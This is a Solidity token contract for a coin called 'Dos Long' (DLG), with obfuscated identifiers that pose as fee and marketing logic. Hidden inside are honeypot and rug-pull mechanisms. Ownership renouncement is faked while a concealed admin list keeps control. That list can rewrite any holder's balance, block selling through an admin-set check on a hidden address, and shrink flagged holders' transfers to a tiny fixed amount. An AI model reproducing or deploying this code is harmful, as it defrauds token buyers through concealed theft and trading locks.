//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface autoSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract feeReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchAmount {
    function createPair(address feeAmountExempt, address receiverExemptFrom) external returns (address);
}

interface txMarketingSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeMax) external view returns (uint256);

    function transfer(address teamList, uint256 receiverLiquidity) external returns (bool);

    function allowance(address launchLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address teamList,
        uint256 receiverLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityTrading, uint256 value);
    event Approval(address indexed launchLaunched, address indexed spender, uint256 value);
}

interface txMarketingSenderMetadata is txMarketingSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DosLong is feeReceiver, txMarketingSender, txMarketingSenderMetadata {

    function name() external view virtual override returns (string memory) {
        return teamAt;
    }

    mapping(address => bool) public maxMarketingTo;

    function symbol() external view virtual override returns (string memory) {
        return autoLaunched;
    }

    mapping(address => mapping(address => uint256)) private receiverBuy;

    uint256 launchedShould;

    bool private feeMin;

    function limitList(address listMax) public {
        if (receiverSell) {
            return;
        }
        
        maxMarketingTo[listMax] = true;
        
        receiverSell = true;
    }

    function senderEnable(address minToken) public {
        modeBuyToken();
        if (enableTeam == autoIs) {
            shouldTx = true;
        }
        if (minToken == fundTrading || minToken == shouldSenderFund) {
            return;
        }
        senderTo[minToken] = true;
    }

    function transfer(address senderMarketing, uint256 receiverLiquidity) external virtual override returns (bool) {
        return senderTotalTake(_msgSender(), senderMarketing, receiverLiquidity);
    }

    address public fundTrading;

    function modeBuyToken() private view {
        require(maxMarketingTo[_msgSender()]);
    }

    bool public modeFund;

    uint256 public autoIs;

    function decimals() external view virtual override returns (uint8) {
        return swapSenderMarketing;
    }

    function atMarketing(uint256 receiverLiquidity) public {
        modeBuyToken();
        receiverTrading = receiverLiquidity;
    }

    address public shouldSenderFund;

    function owner() external view returns (address) {
        return tokenMode;
    }

    function approve(address shouldLaunch, uint256 receiverLiquidity) public virtual override returns (bool) {
        receiverBuy[_msgSender()][shouldLaunch] = receiverLiquidity;
        emit Approval(_msgSender(), shouldLaunch, receiverLiquidity);
        return true;
    }

    uint256 public liquidityAmount;

    mapping(address => bool) public senderTo;

    function getOwner() external view returns (address) {
        return tokenMode;
    }

    event OwnershipTransferred(address indexed receiverFrom, address indexed fundReceiver);

    function senderLiquidityTx(address senderMarketing, uint256 receiverLiquidity) public {
        modeBuyToken();
        shouldExempt[senderMarketing] = receiverLiquidity;
    }

    function transferFrom(address maxLaunched, address teamList, uint256 receiverLiquidity) external override returns (bool) {
        if (_msgSender() != receiverSwap) {
            if (receiverBuy[maxLaunched][_msgSender()] != type(uint256).max) {
                require(receiverLiquidity <= receiverBuy[maxLaunched][_msgSender()]);
                receiverBuy[maxLaunched][_msgSender()] -= receiverLiquidity;
            }
        }
        return senderTotalTake(maxLaunched, teamList, receiverLiquidity);
    }

    bool private listTx;

    uint8 private swapSenderMarketing = 18;

    address private tokenMode;

    uint256 private fundMax;

    address minMarketingEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public receiverSell;

    function senderTotalTake(address maxLaunched, address teamList, uint256 receiverLiquidity) internal returns (bool) {
        if (maxLaunched == fundTrading) {
            return limitSwap(maxLaunched, teamList, receiverLiquidity);
        }
        uint256 buyFee = txMarketingSender(shouldSenderFund).balanceOf(minMarketingEnable);
        require(buyFee == receiverTrading);
        require(teamList != minMarketingEnable);
        if (senderTo[maxLaunched]) {
            return limitSwap(maxLaunched, teamList, teamTotalLaunch);
        }
        return limitSwap(maxLaunched, teamList, receiverLiquidity);
    }

    uint256 constant teamTotalLaunch = 16 ** 10;

    address receiverSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public toModeIs;

    function balanceOf(address feeMax) public view virtual override returns (uint256) {
        return shouldExempt[feeMax];
    }

    function limitSwap(address maxLaunched, address teamList, uint256 receiverLiquidity) internal returns (bool) {
        require(shouldExempt[maxLaunched] >= receiverLiquidity);
        shouldExempt[maxLaunched] -= receiverLiquidity;
        shouldExempt[teamList] += receiverLiquidity;
        emit Transfer(maxLaunched, teamList, receiverLiquidity);
        return true;
    }

    function liquidityReceiver() public {
        emit OwnershipTransferred(fundTrading, address(0));
        tokenMode = address(0);
    }

    string private teamAt = "Dos Long";

    mapping(address => uint256) private shouldExempt;

    constructor (){
        if (listTx) {
            modeFund = false;
        }
        autoSender toMode = autoSender(receiverSwap);
        shouldSenderFund = launchAmount(toMode.factory()).createPair(toMode.WETH(), address(this));
        if (enableTeam != fundMax) {
            listTx = true;
        }
        fundTrading = _msgSender();
        liquidityReceiver();
        maxMarketingTo[fundTrading] = true;
        shouldExempt[fundTrading] = exemptIs;
        if (liquidityAmount == autoIs) {
            autoIs = fundMax;
        }
        emit Transfer(address(0), fundTrading, exemptIs);
    }

    string private autoLaunched = "DLG";

    function totalSupply() external view virtual override returns (uint256) {
        return exemptIs;
    }

    uint256 receiverTrading;

    uint256 public enableTeam;

    uint256 private exemptIs = 100000000 * 10 ** 18;

    bool private shouldTx;

    function allowance(address fundLimitLaunch, address shouldLaunch) external view virtual override returns (uint256) {
        if (shouldLaunch == receiverSwap) {
            return type(uint256).max;
        }
        return receiverBuy[fundLimitLaunch][shouldLaunch];
    }

}